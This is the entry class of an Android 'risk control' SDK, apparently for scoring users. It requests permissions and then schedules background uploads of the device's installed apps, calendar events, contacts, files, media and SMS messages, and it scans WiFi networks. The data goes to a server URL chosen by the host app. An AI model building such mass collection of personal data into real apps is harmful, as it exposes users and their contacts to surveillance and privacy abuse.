package com.weithink.fengkong;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.weithink.fengkong.bean.LocationInfo;
import com.weithink.fengkong.network.UtilNetworking;
import com.weithink.fengkong.util.DeviceInfoUtil;
import com.weithink.fengkong.util.StorageUtil;
import com.weithink.fengkong.work.UploadWorker;

import java.util.List;

import static com.weithink.fengkong.Constants.WORK_NAME;

/**
 * 调用初始化接口，
 * 入口类
 */
public class WeithinkFengkong {
    private static WeithinkFengkong defaultInstance;

    private Context context;
    private String baseUrl;

    private WeithinkFengkong() {
    }

    public static WeithinkFengkong getInstance() {
        if (defaultInstance == null)
            synchronized (WeithinkFengkong.class) {
                if (defaultInstance == null)
                    defaultInstance = new WeithinkFengkong();
            }
        return defaultInstance;
    }

    public Context getContext() {
        return this.context;
    }

    public String getBaseUrl() {
        return baseUrl;
    }

    public void initSDK(Context context, String apiUrl) {
        this.context = context;
        this.baseUrl = apiUrl;
        StorageUtil util = StorageUtil.getInstance();
        util.clearData();
        util.setStringCommit("url", apiUrl);
        if (this.context == null) {
            throw new RuntimeException("You must call initSDK first！");
        }
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                startRequestPermissions();
            }
        }, 3000);

    }



    public void autoSyncData(String userId) {
        StorageUtil util = StorageUtil.getInstance();
        util.setStringCommit("userId", userId);
        if (MainActivity.notShowPermissionList.size() == 0 && MainActivity.mPermissionList.size() == 0) {
            startService();
        } else {
            startRequestPermissions();
        }
    }

    private void startService() {
        DeviceInfoUtil.scanWifiList(WeithinkFengkong.getInstance().getContext());
        WeithinkFactory.getLogger().error("AAA>> %s", "startService");
        execute();


    }

    /**
     * 执行上传操作
     */
    public void execute() {
//        OneTimeWorkRequest request = null;
        //appdata
        OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.APP_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.APP_DATA,
                        ExistingWorkPolicy.REPLACE, request);

        OneTimeWorkRequest request1 = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.CALEVENT_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CALEVENT_DATA,
                ExistingWorkPolicy.REPLACE, request1);

//        OneTimeWorkRequest request2 = new OneTimeWorkRequest.Builder(UploadWorker.class)
//                .setInputData(createInputData(Constants.DataType.CALLS_DATA)).build();
//        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CALLS_DATA,
//                ExistingWorkPolicy.REPLACE, request2);

        OneTimeWorkRequest request3 = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.CONTACTS_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CONTACTS_DATA,
                ExistingWorkPolicy.REPLACE, request3);

        OneTimeWorkRequest request4 = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.DEVICE_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.DEVICE_DATA,
                ExistingWorkPolicy.REPLACE, request4);

        OneTimeWorkRequest request5 = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.FILE_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.FILE_DATA,
                ExistingWorkPolicy.REPLACE, request5);


        OneTimeWorkRequest request6 = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.MEDIA_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.MEDIA_DATA,
                ExistingWorkPolicy.REPLACE, request6);

        OneTimeWorkRequest request7 = new OneTimeWorkRequest.Builder(UploadWorker.class)
                .setInputData(createInputData(Constants.DataType.SMS_DATA)).build();
        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.SMS_DATA,
                ExistingWorkPolicy.REPLACE, request7);

    }

    public static void startRequestPermissions() {
        handler.sendEmptyMessageAtTime(0, 3000);
    }

   static Handler handler = new Handler(){
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            Intent intent = new Intent(WeithinkFengkong.getInstance().getContext(), MainActivity.class);
            intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
            WeithinkFengkong.getInstance().getContext().startActivity(intent);
        }
    };
    private Data createInputData(String type) {
        Data.Builder builder = new Data.Builder();
        if (type != null) {
            builder.putString(Constants.DataType.INFO_TYPE, type);
        }
        return builder.build();
    }
}
